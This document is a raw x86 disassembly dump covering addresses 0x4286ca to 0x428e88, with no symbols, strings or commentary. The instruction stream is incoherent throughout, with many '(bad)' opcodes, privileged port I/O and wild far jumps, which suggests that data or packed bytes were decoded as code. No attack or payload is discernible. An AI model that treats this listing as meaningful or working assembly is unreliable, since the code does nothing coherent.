  4286ca:	mov    bl,0x82
  4286cc:	lock cdq 
  4286ce:	mov    esp,0x2273
  4286d3:	add    BYTE PTR [eax],al
  4286d5:	add    BYTE PTR [ebp-0x4c],dh
  4286d8:	iret   
  4286d9:	and    eax,DWORD PTR [ebp+0x466ae993]
  4286df:	mov    cl,0x51
  4286e1:	xchg   edx,eax
  4286e2:	jne    0x42873d
  4286e4:	lods   eax,DWORD PTR ds:[esi]
  4286e5:	xchg   DWORD PTR [ecx],esi
  4286e7:	std    
  4286e8:	out    dx,al
  4286e9:	out    0x22,eax
  4286eb:	pop    esi
  4286ec:	push   ebp
  4286ed:	sti    
  4286ee:	cmc    
  4286ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286f0:	sbb    ecx,DWORD PTR [ebx]
  4286f2:	jne    0x428750
  4286f4:	jnp    0x428676
  4286f6:	jne    0x428751
  4286f8:	(bad)  
  4286f9:	jg     0x42872b
  4286fb:	popa   
  4286fc:	push   DWORD PTR [ebx+0x23]
  4286ff:	(bad)  
  428700:	mov    edi,0x67698523
  428705:	sbb    al,0x4
  428707:	push   esp
  428708:	push   edx
  428709:	xchg   DWORD PTR [ebp+0x6b7449e6],eax
  42870f:	fs retf 
  428711:	and    esp,DWORD PTR [ebp+0x13]
  428714:	out    0x69,al
  428716:	es inc ecx
  428718:	cmp    eax,0xad597592
  42871d:	xchg   DWORD PTR [ecx-0x15181103],esi
  428723:	dec    ebp
  428724:	push   ebp
  428725:	sti    
  428726:	cmc    
  428727:	adc    al,0x20
  428729:	or     esi,DWORD PTR [ebp+0x15]
  42872c:	enter  0xc98c,0x3d
  428730:	jmp    0x428719
  428732:	das    
  428733:	(bad)  
  428734:	push   esp
  428735:	sti    
  428736:	iret   
  428737:	dec    ecx
  428738:	xchg   bl,al
  42873a:	add    BYTE PTR [eax],al
  42873c:	add    BYTE PTR [eax],al
  42873e:	add    ch,al
  428740:	call   ebx
  428742:	dec    esi
  428743:	sbb    eax,0x75006ce4
  428748:	in     eax,0x3e
  42874a:	je     0x4287b3
  42874c:	out    0xba,al
  42874e:	and    esp,DWORD PTR [ebp-0x17]
  428751:	imul   eax,DWORD PTR [ecx+0x566301e3],0xfffffffa
  428758:	push   ecx
  428759:	fs dec ebp
  42875b:	sub    esp,0xf296cf51
  428761:	mov    dl,0xe9
  428763:	gs scas eax,DWORD PTR es:[edi]
  428765:	push   eax
  428766:	aad    0x4
  428768:	add    ch,cl
  42876a:	lods   eax,DWORD PTR ds:[esi]
  42876b:	repnz lds ecx,FWORD PTR [ebx+esi*8]
  42876f:	ficomp DWORD PTR [edx]
  428771:	in     eax,dx
  428772:	push   ebp
  428773:	into   
  428774:	and    DWORD PTR [ebp-0x6afd91e1],0xfe3ef3ff
  42877e:	add    eax,0xf8010eae
  428783:	outs   dx,BYTE PTR ds:[esi]
  428784:	dec    esp
  428785:	add    dh,BYTE PTR [edx+0x55bcf29a]
  42878b:	sahf   
  42878c:	push   cs
  42878d:	sub    DWORD PTR [esi+0x605da72c],esi
  428793:	sub    BYTE PTR [eax-0x13],al
  428796:	add    ebp,DWORD PTR [eax]
  428798:	ja     0x428767
  42879a:	adc    DWORD PTR [ecx-0x669797b7],0x3e8fe
  4287a4:	add    BYTE PTR [eax],al
  4287a6:	add    BYTE PTR [eax],al
  4287a8:	hlt    
  4287a9:	(bad)  
  4287aa:	loopne 0x4287af
  4287ac:	jne    0x428750
  4287ae:	jmp    0xe1f44c63
  4287b3:	xor    BYTE PTR [edx+0x5d03e903],0x16
  4287ba:	in     al,dx
  4287bb:	add    esi,DWORD PTR [ebp-0x4e]
  4287be:	nop
  4287bf:	std    
  4287c0:	loopne 0x4287c4
  4287c2:	jmp    0x8a58d54f
  4287c7:	sbb    DWORD PTR [esi-0x6],ecx
  4287ca:	ins    BYTE PTR es:[edi],dx
  4287cb:	enter  0x275,0xe9
  4287cf:	xchg   BYTE PTR [ecx-0x3922ffe2],dh
  4287d5:	jp     0x428833
  4287d7:	lds    ecx,FWORD PTR [esi]
  4287d9:	bound  ebx,QWORD PTR [esi-0x7bb2548b]
  4287df:	sub    DWORD PTR [eax+0x7e],esi
  4287e2:	sub    eax,ebp
  4287e4:	jbe    0x4287e8
  4287e6:	lea    esp,[ebp+0x514ff28a]
  4287ec:	cmp    esi,DWORD PTR [edi-0x6]
  4287ef:	ds in  al,dx
  4287f1:	push   edx
  4287f2:	aaa    
  4287f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4287f5:	out    0xfa,eax
  4287f7:	mov    ch,0x6a
  4287f9:	repnz push ecx
  4287fb:	xchg   ebx,eax
  4287fc:	fidivr DWORD PTR [eax+0x24a12e7]
  428802:	add    BYTE PTR [edi-0x5dc4102],bh
  428808:	push   ds
  428809:	data16 aaa 
  42880b:	pop    es
  42880c:	add    BYTE PTR [eax],al
  42880e:	add    BYTE PTR [eax],al
  428810:	add    BYTE PTR [eax-0x7e],cl
  428813:	jl     0x4287da
  428815:	jno    0x428819
  428817:	or     ebp,DWORD PTR [ebp+0x40]
  42881a:	add    al,BYTE PTR [eax]
  42881c:	jmp    0x1665714
  428821:	adc    DWORD PTR [ecx-0x1fde2076],ebp
  428827:	or     al,0x62
  428829:	mov    al,0xb2
  42882b:	gs cmp al,0x24
  42882e:	popa   
  42882f:	rcr    BYTE PTR [esi+esi*2+0x2],0x84
  428834:	test   eax,0xe9d97e71
  428839:	jbe    0x42883d
  42883b:	in     ax,0x5e
  42883e:	std    
  42883f:	jnp    0x42886a
  428841:	jns    0x428823
  428843:	je     0x42887f
  428845:	leave  
  428846:	fwait
  428847:	xchg   ebp,eax
  428848:	jmp    0xdf0306c3
  42884d:	stos   BYTE PTR es:[edi],al
  42884e:	mov    BYTE PTR [eax],al
  428850:	add    BYTE PTR [eax*1-0x7776fb9e],cl
  428857:	add    edx,DWORD PTR [eax+0x76]
  42885a:	cmp    BYTE PTR [edx-0x18],cl
  42885d:	scas   eax,DWORD PTR es:[edi]
  42885e:	fdivr  st,st(7)
  428860:	call   DWORD PTR [eax-0x177bf93b]
  428866:	add    al,0x0
  428868:	add    BYTE PTR [ebp-0x1d89eccf],al
  42886e:	lods   eax,DWORD PTR ds:[esi]
  42886f:	je     0x428889
  428871:	cmp    edi,DWORD PTR [eax]
  428873:	punpckhdq mm0,QWORD PTR [eax]
  428876:	add    BYTE PTR [eax],al
  428878:	add    BYTE PTR [eax],al
  42887a:	and    edx,DWORD PTR [edx+0x53178e3]
  428880:	add    BYTE PTR [esp+ebx*4-0x336e7c02],al
  428887:	add    al,0x0
  428889:	cmp    ecx,ebx
  42888b:	add    BYTE PTR [edi+ecx*1-0x75],dh
  42888f:	cmp    BYTE PTR [edi],al
  428891:	push   0xfffffff5
  428893:	xchg   ecx,eax
  428894:	jecxz  0x428876
  428896:	inc    ecx
  428897:	add    eax,0x394c8400
  42889c:	jl     0x4288d7
  42889e:	or     DWORD PTR [ebp+0x6f],edx
  4288a1:	setnp  BYTE PTR [esi]
  4288a4:	or     ebp,DWORD PTR [edx+0x26]
  4288a7:	xchg   ecx,eax
  4288a8:	jecxz  0x428876
  4288aa:	add    esi,edi
  4288ac:	inc    DWORD PTR [ebx-0x7297d4e4]
  4288b2:	mov    eax,0x90c6281a
  4288b7:	sbb    al,BYTE PTR [edi]
  4288b9:	add    BYTE PTR [esp+ecx*4-0x9],al
  4288bd:	dec    DWORD PTR [ebx]
  4288bf:	sub    DWORD PTR [eax],eax
  4288c1:	mov    edx,DWORD PTR [ebx]
  4288c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4288c4:	je     0x4288c0
  4288c6:	sbb    esi,DWORD PTR [ebx+eax*4-0x73119f40]
  4288cd:	mov    ah,0x75
  4288cf:	xor    eax,0x5a2afdbf
  4288d4:	push   edi
  4288d5:	xchg   esp,eax
  4288d6:	adc    eax,DWORD PTR [eax+0x3d99874f]
  4288dc:	adc    ecx,DWORD PTR [ebp+0x0]
  4288e2:	add    cl,bh
  4288e4:	xor    eax,0x5a0afe2f
  4288e9:	scas   eax,DWORD PTR es:[edi]
  4288ea:	dec    esi
  4288eb:	or     eax,0x75007412
  4288f0:	rol    edi,1
  4288f2:	and    eax,DWORD PTR [edx+0x75015e72]
  4288f8:	pop    ecx
  4288f9:	jp     0x4288bd
  4288fb:	mov    ebx,0x2c3fff59
  428900:	mov    cs,WORD PTR [esi+eiz*2+0x75]
  428904:	fmulp  st(7),st
  428906:	and    ebx,DWORD PTR [ecx-0x3d09203f]
  42890c:	and    BYTE PTR [edi+0x2f],cl
  42890f:	int    0xbf
  428911:	or     edx,edi
  428913:	mov    dl,0x8c
  428915:	push   edi
  428916:	mov    al,ds:0x864ef76f
  42891b:	cmp    DWORD PTR ds:0x486ae6fe,esi
  428921:	adc    ch,al
  428923:	out    0x93,al
  428925:	push   ecx
  428926:	sti    
  428927:	add    DWORD PTR es:[ecx+0x15608336],eax
  42892e:	rcr    BYTE PTR [edx],0x7
  428931:	stos   DWORD PTR es:[edi],eax
  428932:	xchg   BYTE PTR [eax+0xe],bl
  428935:	inc    edx
  428936:	adc    al,0x75
  428938:	push   cs
  428939:	jnp    0x428927
  42893b:	out    dx,al
  42893c:	push   esi
  42893d:	sub    ah,0xc1
  428940:	in     al,dx
  428941:	mov    dh,0x65
  428943:	je     0x428923
  428945:	mov    edi,0xab
  42894a:	add    BYTE PTR [eax],al
  42894c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42894d:	out    dx,eax
  42894e:	adc    dl,bh
  428950:	inc    edx
  428951:	add    bh,BYTE PTR [ecx]
  428953:	adc    al,0xf0
  428955:	inc    ecx
  428956:	adc    al,0xcb
  428958:	sti    
  428959:	mov    esp,0x275105c
  42895e:	dec    ecx
  42895f:	add    edx,DWORD PTR [edx-0x1d4f3ffb]
  428965:	int3   
  428966:	shl    BYTE PTR [ebx+0x5b70bcfd],0x45
  42896d:	or     al,0x6b
  42896f:	push   edx
  428970:	cli    
  428971:	dec    ecx
  428972:	push   ds
  428973:	dec    edi
  428974:	sbb    DWORD PTR [ecx],0xb500096e
  42897a:	push   eax
  42897b:	mov    ah,0xef
  42897d:	int3   
  42897e:	push   eax
  42897f:	mov    edx,0xff994744
  428984:	icebp  
  428985:	inc    ecx
  428986:	mov    ah,0xf4
  428988:	iret   
  428989:	int3   
  42898a:	xor    BYTE PTR [edx-0x491f3331],bh
  428990:	pop    eax
  428991:	add    al,0x11
  428993:	lock mov esp,0xcd7d1a46
  428999:	scas   al,BYTE PTR es:[edi]
  42899a:	add    BYTE PTR [ebx+eiz*2],ah
  42899d:	dec    eax
  42899e:	or     dh,BYTE PTR [edx+0x3c9e42f8]
  4289a4:	(bad)  
  4289a6:	call   0x66988563
  4289ab:	pop    edi
  4289ac:	popa   
  4289ad:	add    DWORD PTR [edi+ecx*2+0x0],0x0
  4289b5:	jne    0x42896a
  4289b7:	jae    0x428980
  4289b9:	bound  esi,QWORD PTR [edx+0x7786d7d9]
  4289bf:	sub    al,0x4c
  4289c1:	lds    esi,FWORD PTR [edi+0x24]
  4289c4:	push   eax
  4289c5:	lds    ebx,FWORD PTR [edx-0x21]
  4289c8:	daa    
  4289c9:	pop    esi
  4289ca:	inc    esi
  4289cb:	fs inc esp
  4289cd:	leave  
  4289ce:	(bad)  
  4289cf:	(bad)  
  4289d0:	cli    
  4289d1:	mov    dh,0x5d
  4289d3:	inc    edi
  4289d4:	bound  edi,QWORD PTR [edx]
  4289d6:	dec    esi
  4289d7:	daa    
  4289d8:	sub    al,0xa5
  4289da:	lds    esp,FWORD PTR [ebp+ecx*4+0x79]
  4289de:	lds    esp,FWORD PTR [ebp+ebx*4+0x71]
  4289e2:	xor    edi,eax
  4289e4:	cmp    esp,eax
  4289e6:	iret   
  4289e7:	sti    
  4289e8:	je     0x428a1c
  4289ea:	pop    edx
  4289eb:	push   eax
  4289ec:	xchg   ecx,eax
  4289ed:	out    0x9a,al
  4289ef:	sti    
  4289f0:	jbe    0x428996
  4289f2:	iret   
  4289f3:	sti    
  4289f4:	arpl   WORD PTR [ecx+0x5a],dx
  4289f7:	(bad)  
  4289f8:	and    BYTE PTR [edi-0x32bd7bb7],ah
  4289fe:	repz cli 
  428a00:	fadd   QWORD PTR [edx+0x49]
  428a03:	jne    0x428a42
  428a05:	inc    esp
  428a06:	iret   
  428a07:	cmovbe eax,edx
  428a0a:	stc    
  428a0b:	cli    
  428a0c:	mov    ah,0xce
  428a0e:	pop    ebp
  428a0f:	mov    ds:0x86492434,eax
  428a14:	adc    DWORD PTR [edi+ecx*8],esp
  428a17:	jmp    0x428a2a
  428a19:	add    BYTE PTR [eax],al
  428a1b:	add    BYTE PTR [eax],al
  428a1d:	add    dh,bl
  428a1f:	or     edi,edx
  428a21:	push   ds
  428a22:	xor    eax,DWORD PTR [ebp-0x50cfdfa9]
  428a28:	xchg   ch,bh
  428a2a:	stc    
  428a2b:	push   esi
  428a2c:	or     al,0x9a
  428a2e:	fisttp QWORD PTR [eax+0x75]
  428a31:	icebp  
  428a32:	adc    eax,edi
  428a34:	repz mov edx,0x661f5a59
  428a3a:	jns    0x428a3e
  428a3c:	test   BYTE PTR [ecx+0x54fb1ea2],ch
  428a42:	ror    DWORD PTR [ebx],0x5d
  428a45:	in     eax,0xc5
  428a47:	iret   
  428a48:	repz bound edi,QWORD PTR [ebx]
  428a4b:	std    
  428a4c:	cli    
  428a4d:	add    BYTE PTR [ecx-0x66baf9b2],bl
  428a53:	add    dl,BYTE PTR [eax+0x6a]
  428a56:	pop    esi
  428a57:	test   eax,0xb213fd63
  428a5c:	div    BYTE PTR [ebp-0x28]
  428a5f:	(bad)  
  428a60:	xlat   BYTE PTR ds:[ebx]
  428a61:	call   0x3883e0
  428a66:	arpl   sp,ax
  428a68:	mov    edx,0xbbed55b
  428a6d:	add    BYTE PTR [ecx-0x39],bh
  428a70:	jmp    0x4289f3
  428a72:	add    BYTE PTR [ebp-0x1],cl
  428a75:	call   FWORD PTR [esi+ecx*4]
  428a78:	dec    esi
  428a79:	mov    eax,DWORD PTR [esp+eax*8-0x4d68137c]
  428a80:	not    BYTE PTR [eax+0x0]
  428a83:	add    BYTE PTR [eax],al
  428a85:	add    BYTE PTR [eax],al
  428a87:	les    ebp,FWORD PTR [edx-0x12230001]
  428a8d:	sar    bh,cl
  428a8f:	jmp    0xcc829ac0
  428a94:	mov    BYTE PTR [esi*8+0x770000dc],bh
  428a9b:	jecxz  0x428a60
  428a9d:	test   ah,dh
  428a9f:	xchg   ecx,eax
  428aa0:	mov    dl,0xf6
  428aa2:	push   eax
  428aa3:	jmp    FWORD PTR [eax]
  428aa5:	or     edi,DWORD PTR [esp+ebx*8+0x0]
  428aa9:	lea    eax,[ebp-0x94990]
  428aaf:	fdiv   QWORD PTR [ecx+0x40bee814]
  428ab5:	sti    
  428ab6:	test   BYTE PTR [ebp+ebp*1+0x40],bl
  428aba:	lea    ebx,[ecx]
  428abc:	lods   eax,DWORD PTR ds:[esi]
  428abd:	cld    
  428abe:	call   DWORD PTR [ebx+0xa7de38f]
  428ac4:	(bad)  
  428ac5:	inc    DWORD PTR [ebx-0x72cfd4e4]
  428acb:	jne    0x428aa3
  428acd:	push   edi
  428ace:	std    
  428acf:	bound  esi,QWORD PTR ds:0xfb4ee7b4
  428ad5:	add    eax,DWORD PTR [eax]
  428ad7:	stc    
  428ad8:	cdq    
  428ad9:	fsub   DWORD PTR [eax]
  428adb:	dec    edx
  428adc:	pop    es
  428add:	cld    
  428ade:	xchg   BYTE PTR [edx-0xf7350a3],bh
  428ae4:	gs push ecx
  428ae6:	sti    
  428ae7:	xor    cl,BYTE PTR [edx]
  428ae9:	pop    esp
  428aea:	inc    eax
  428aeb:	add    BYTE PTR [eax],al
  428aed:	add    BYTE PTR [eax],al
  428aef:	add    BYTE PTR [edx],ch
  428af1:	ins    DWORD PTR es:[edi],dx
  428af2:	dec    ebx
  428af3:	xchg   BYTE PTR ds:0x18f488a7,bh
  428af9:	jge    0x428b46
  428afb:	push   eax
  428afc:	sbb    eax,0x75008212
  428b01:	in     al,dx
  428b02:	jne    0x428ac3
  428b04:	sahf   
  428b05:	mov    ds:0x8675043e,al
  428b0a:	jbe    0x428af8
  428b0c:	hlt    
  428b0d:	mov    ch,0x27
  428b0f:	(bad)  
  428b10:	jmp    0x15b:0xcd52b559
  428b17:	add    BYTE PTR [ebp+0x2f],dh
  428b1a:	(bad)  
  428b1b:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  428b1d:	mov    ds:0xbff6f152,al
  428b22:	add    esi,DWORD PTR [eax+ebp*2-0x61]
  428b26:	ror    DWORD PTR [eax],cl
  428b28:	mov    dl,0x96
  428b2a:	inc    edi
  428b2b:	add    dh,BYTE PTR [ebp+0x59]
  428b2e:	jmp    esi
  428b30:	test   DWORD PTR [ecx+ecx*8],edx
  428b33:	idiv   DWORD PTR [ecx+0x59]
  428b36:	(bad)  
  428b37:	dec    DWORD PTR [esi-0x72babdac]
  428b3d:	push   edi
  428b3e:	(bad)  
  428b3f:	push   DWORD PTR [ebp+0x7f]
  428b42:	dec    BYTE PTR [eax+edi*1+0x7565b3fb]
  428b49:	add    cl,BYTE PTR [edi+0x3]
  428b4c:	int    0x5a
  428b4e:	imul   eax,DWORD PTR [ecx],0x1e3f0275
  428b54:	add    BYTE PTR [eax],al
  428b56:	add    BYTE PTR [eax],al
  428b58:	add    BYTE PTR [ebp+0x56c85fdc],bh
  428b5e:	jne    0x428bcc
  428b60:	das    
  428b61:	push   eax
  428b62:	inc    ebx
  428b63:	mov    edx,0xb0bcf3b3
  428b68:	add    BYTE PTR [ebp+0x2],dh
  428b6b:	jmp    0x2cb83077
  428b70:	push   0x3ea984c5
  428b75:	push   0x2
  428b77:	cmp    ebx,edx
  428b79:	and    bl,BYTE PTR [ebx+0x3b]
  428b7c:	inc    edx
  428b7d:	push   ds
  428b7e:	inc    ebx
  428b7f:	outs   dx,BYTE PTR ds:[esi]
  428b80:	dec    ebx
  428b81:	clc    
  428b82:	inc    edx
  428b83:	hlt    
  428b84:	pop    es
  428b85:	pop    ebx
  428b86:	inc    edx
  428b87:	jle    0x428ba7
  428b89:	lock mov esp,0x5aa4b378
  428b8f:	xchg   edx,eax
  428b90:	xchg   DWORD PTR [ebp+0x2],esi
  428b93:	gs inc ebx
  428b95:	pusha  
  428b96:	icebp  
  428b97:	mov    esi,0x58bcf1fb
  428b9c:	(bad)  
  428b9e:	mov    dl,0x41
  428ba0:	clc    
  428ba1:	xchg   edx,eax
  428ba2:	in     al,dx
  428ba3:	test   al,0x3
  428ba5:	dec    edx
  428ba6:	ds in  eax,0x4e
  428ba9:	dec    eax
  428baa:	dec    edx
  428bab:	pop    esp
  428bac:	enter  0xb1ca,0xb9
  428bb0:	jp     0x428be2
  428bb2:	cli    
  428bb3:	adc    dh,ah
  428bb5:	lahf   
  428bb6:	inc    ebx
  428bb7:	adc    ch,BYTE PTR [esi+0x727393c]
  428bbd:	add    BYTE PTR [eax],al
  428bbf:	add    BYTE PTR [eax],al
  428bc1:	add    BYTE PTR [ebp+0xf],dh
  428bc4:	xor    BYTE PTR [edx+0x3a62c95],ah
  428bca:	xor    al,0x8a
  428bcc:	add    BYTE PTR [ecx],cl
  428bce:	cmp    eax,0xff970003
  428bd3:	icebp  
  428bd4:	xchg   bl,bl
  428bd6:	mov    dh,0x2c
  428bd8:	sbb    bl,BYTE PTR [edx]
  428bda:	(bad)  
  428bdb:	stos   DWORD PTR es:[edi],eax
  428bdc:	icebp  
  428bdd:	dec    esp
  428bde:	fiadd  WORD PTR ds:0x8bc7ea6c
  428be4:	jo     0x428bd3
  428be6:	cmc    
  428be7:	inc    edx
  428be8:	add    al,0x28
  428bea:	jp     0x428b8a
  428bec:	fld    TBYTE PTR [edx]
  428bee:	jns    0x428bae
  428bf0:	loopne 0x428c52
  428bf2:	cmp    bh,BYTE PTR [edx-0x25]
  428bf5:	sub    bh,BYTE PTR [ecx-0x24]
  428bf8:	mov    esi,0x3f5df948
  428bfd:	jmp    0xe9403e75
  428c02:	jbe    0x428c11
  428c04:	mov    WORD PTR [ecx],?
  428c06:	jns    0x428c0a
  428c08:	add    BYTE PTR [edi],dl
  428c0a:	shl    al,0xcd
  428c0d:	aaa    
  428c0e:	mov    al,0x3d
  428c10:	sti    
  428c11:	out    dx,al
  428c12:	jge    0x428c5c
  428c14:	xchg   ebp,ebp
  428c16:	jae    0x428c3e
  428c18:	aad    0xaa
  428c1a:	jbe    0x428c0d
  428c1c:	add    esp,DWORD PTR [ecx+ebx*2+0x57]
  428c20:	aas    
  428c21:	jmp    0xed71d0bb
  428c26:	add    BYTE PTR [eax],al
  428c28:	add    BYTE PTR [eax],al
  428c2a:	add    BYTE PTR [ebx+0x22],dl
  428c2d:	aad    0xaa
  428c2f:	jbe    0x428bba
  428c31:	clc    
  428c32:	sbb    BYTE PTR [ecx],ah
  428c34:	shl    edx,0xe8
  428c37:	gs push es
  428c39:	mov    ebp,0x13831
  428c3e:	fidiv  DWORD PTR [edx-0x71]
  428c41:	adc    al,0x35
  428c43:	mov    ah,0x41
  428c45:	inc    ecx
  428c46:	pusha  
  428c47:	ins    DWORD PTR es:[edi],dx
  428c48:	(bad)  
  428c49:	loopne 0x428c4b
  428c4b:	jno    0x428c90
  428c4d:	sti    
  428c4e:	xor    BYTE PTR [esi-0x5d],0xff
  428c52:	dec    DWORD PTR [ecx+edx*2+0x5e8681bd]
  428c59:	std    
  428c5a:	call   FWORD PTR [eax+edx*2+0x2a]
  428c5e:	lea    ebx,[eax-0x48]
  428c61:	(bad)  
  428c63:	pop    DWORD PTR [esi]
  428c65:	add    DWORD PTR [ecx],0x7f
  428c68:	inc    ebp
  428c69:	jmp    DWORD PTR [edx]
  428c6b:	and    dl,BYTE PTR [edx]
  428c6d:	add    DWORD PTR [ebx+0x1df8234],ecx
  428c73:	xlat   BYTE PTR ds:[ebx]
  428c74:	adc    DWORD PTR [ebp-0x4bdec38],edi
  428c7a:	xor    dl,BYTE PTR [ebp+0xbfff759]
  428c80:	hlt    
  428c81:	out    0x33,eax
  428c83:	add    al,0xbc
  428c85:	cmp    BYTE PTR [ebx-0x67ef733],al
  428c8b:	cwde   
  428c8c:	out    dx,al
  428c8d:	cmp    al,BYTE PTR [eax]
  428c8f:	add    BYTE PTR [eax],al
  428c91:	add    BYTE PTR [eax],al
  428c93:	add    BYTE PTR [eax],cl
  428c95:	stc    
  428c96:	or     BYTE PTR ds:0x3aeea8,0xad
  428c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c9e:	aam    0x43
  428ca0:	fcom   QWORD PTR [ecx]
  428ca2:	shl    DWORD PTR [ebx],0x92
  428ca5:	adc    al,cl
  428ca7:	mov    edx,DWORD PTR [esp+esi*8+0x42d83e7]
  428cae:	sub    eax,DWORD PTR [ecx+ecx*2]
  428cb1:	std    
  428cb2:	mov    esi,0x2a6ddc43
  428cb7:	add    eax,0x3af09c
  428cbc:	jmp    0x2b04:0xdfdf9c61
  428cc3:	shl    BYTE PTR [edi],0x41
  428cc6:	test   al,ah
  428cc8:	jne    0x428cc8
  428cca:	mov    edi,0x86cc5aff
  428ccf:	(bad)  [esi]
  428cd1:	sub    edi,DWORD PTR [eax-0x3f]
  428cd4:	mov    ah,0x12
  428cd6:	clc    
  428cd7:	lods   eax,DWORD PTR cs:[esi]
  428cd9:	mov    ds:0x92c8253d,eax
  428cde:	or     ebx,edi
  428ce0:	xor    al,0x4a
  428ce2:	jmp    FWORD PTR [esi]
  428ce4:	cmp    eax,0xf12544b5
  428ce9:	js     0x428d32
  428ceb:	sti    
  428cec:	xor    al,0x4a
  428cee:	imul   DWORD PTR [esi]
  428cf0:	cmp    eax,0x5dc144b5
  428cf5:	pop    esp
  428cf6:	adc    al,cl
  428cf8:	add    BYTE PTR [eax],al
  428cfa:	add    BYTE PTR [eax],al
  428cfc:	add    BYTE PTR [esi],dh
  428cfe:	pop    ds
  428cff:	jnp    0x428ced
  428d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d02:	sbb    bl,ah
  428d04:	lahf   
  428d05:	push   edx
  428d06:	in     eax,dx
  428d07:	add    edi,ebx
  428d09:	cmp    BYTE PTR ds:0xa6753ff2,0xc0
  428d10:	test   ebp,0x64aff190
  428d16:	jmp    0x3778121e
  428d1b:	idiv   edx
  428d1d:	push   0x753ff221
  428d22:	test   BYTE PTR [ebx],al
  428d24:	xchg   DWORD PTR [eax],edi
  428d26:	mov    eax,ds:0xe0eba95b
  428d2b:	inc    esi
  428d2c:	mov    al,0x74
  428d2e:	loop   0x428d72
  428d30:	push   0xffc2f115
  428d35:	rcr    DWORD PTR [esi-0x11],cl
  428d38:	push   cs
  428d39:	xor    eax,0x80804229
  428d3e:	jno    0x428d70
  428d40:	aas    
  428d41:	jne    0x428d6c
  428d43:	mov    dl,0x86
  428d45:	nop
  428d46:	add    al,BYTE PTR [ecx]
  428d48:	imul   DWORD PTR [edx+0x2]
  428d4b:	mov    bl,0xb2
  428d4d:	sti    
  428d4e:	std    
  428d4f:	cld    
  428d50:	neg    BYTE PTR [edx+0x2]
  428d53:	xchg   esp,eax
  428d54:	sbb    edi,ecx
  428d56:	dec    edx
  428d57:	sbb    al,0xc7
  428d59:	mov    dl,ch
  428d5b:	stc    
  428d5c:	xor    dh,ch
  428d5e:	std    
  428d5f:	jo     0x428d91
  428d61:	add    BYTE PTR [eax],al
  428d63:	add    BYTE PTR [eax],al
  428d65:	add    BYTE PTR [edx],bh
  428d67:	add    ch,cl
  428d69:	ror    BYTE PTR [eax+0x6e4a7d2a],1
  428d6f:	aas    
  428d70:	gs inc ebx
  428d72:	jmp    0xd9433788
  428d77:	push   ebp
  428d78:	es add al,0xb3
  428d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d7c:	es add al,0x37
  428d7f:	add    eax,0x2823141
  428d84:	call   0x6b95cd3a
  428d89:	mov    ds:0xb1e8c34e,eax
  428d8e:	das    
  428d8f:	push   edi
  428d90:	xchg   ecx,eax
  428d91:	into   
  428d92:	sbb    al,0x3f
  428d94:	xchg   edx,eax
  428d95:	mov    cl,0xf3
  428d97:	cmp    DWORD PTR [edx+0x2246fa36],ecx
  428d9d:	stos   BYTE PTR es:[edi],al
  428d9e:	mov    ds:0x56bfbe43,eax
  428da3:	push   es
  428da4:	sti    
  428da5:	jmp    0x753fd
  428daa:	inc    esp
  428dab:	ret    0x536d
  428dae:	pusha  
  428daf:	push   es
  428db0:	push   ss
  428db1:	inc    esp
  428db2:	fimul  DWORD PTR [esi]
  428db4:	inc    ecx
  428db5:	jl     0x428d95
  428db7:	ds dec edx
  428db9:	push   ss
  428dba:	ret    
  428dbb:	cmp    edi,DWORD PTR ss:[esi+0xb]
  428dbf:	add    esp,DWORD PTR [ebp-0x1f92e1]
  428dc5:	sub    bh,BYTE PTR [edx+0xfa553e]
  428dcb:	add    BYTE PTR [eax],al
  428dcd:	add    BYTE PTR [eax],al
  428dcf:	inc    esp
  428dd0:	stc    
  428dd1:	jae    0x428da0
  428dd3:	mov    ds:0x9fb61fb0,al
  428dd8:	jo     0x428e56
  428dda:	int    0x8a
  428ddc:	shl    DWORD PTR [edi+0x2760e],cl
  428de2:	adc    edi,edi
  428de4:	cmp    bh,bl
  428de6:	inc    BYTE PTR [eax]
  428de8:	into   
  428de9:	and    esp,ebp
  428deb:	inc    BYTE PTR ds:0xb683a70a
  428df1:	and    edi,ecx
  428df3:	inc    eax
  428df4:	and    DWORD PTR [ebx+0x3f],ebx
  428df7:	mov    ebx,0xd83c000e
  428dfc:	cs jg  0x428dbc
  428dff:	inc    ebp
  428e00:	aam    0xfa
  428e02:	cmp    al,0x41
  428e04:	es popf 
  428e06:	mov    esi,0xb98739ac
  428e0b:	mov    esi,0x82c1f7b7
  428e10:	cmp    ebx,edi
  428e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e13:	push   cs
  428e14:	add    eax,DWORD PTR [ecx]
  428e16:	jmp    0xae524491
  428e1b:	fisubr DWORD PTR [ecx]
  428e1d:	sbb    BYTE PTR ds:0x2cc23e39,cl
  428e23:	mov    eax,ds:0x79297bee
  428e28:	and    eax,0x29baae0a
  428e2d:	sub    al,0xed
  428e2f:	mov    dh,0x3d
  428e31:	ret    0xac
  428e34:	add    BYTE PTR [eax],al
  428e36:	add    BYTE PTR [eax],al
  428e38:	inc    esi
  428e39:	sbb    bh,BYTE PTR [ecx+ebp*4+0x76]
  428e3d:	int    0x2e
  428e3f:	xor    bl,BYTE PTR [esi-0x21]
  428e42:	sti    
  428e43:	pusha  
  428e44:	sbb    cl,BYTE PTR [esi]
  428e46:	aaa    
  428e47:	add    BYTE PTR [edi-0x32e47ec5],cl
  428e4d:	add    DWORD PTR [eax],eax
  428e4f:	mov    ecx,DWORD PTR [ecx]
  428e51:	cmp    bh,BYTE PTR [edx-0x20]
  428e54:	int3   
  428e55:	mov    eax,0x86ebf444
  428e5a:	jge    0x428e6c
  428e5c:	mov    cs,WORD PTR [ecx+ebp*1-0x18]
  428e60:	jbe    0x428e2a
  428e62:	idiv   bh
  428e64:	xor    eax,0x9c000106
  428e69:	dec    ebp
  428e6a:	or     eax,edi
  428e6c:	(bad)  
  428e6e:	pop    ss
  428e6f:	jl     0x428e3d
  428e71:	add    DWORD PTR [edi+0x7c156c45],edi
  428e77:	inc    eax
  428e78:	pop    esp
  428e79:	fiadd  WORD PTR ds:0x2bda99c7
  428e7f:	jl     0x428e0d
  428e81:	push   es
  428e82:	mov    edi,0x77292c45
  428e87:	inc    eax
  428e88:	pop    esp
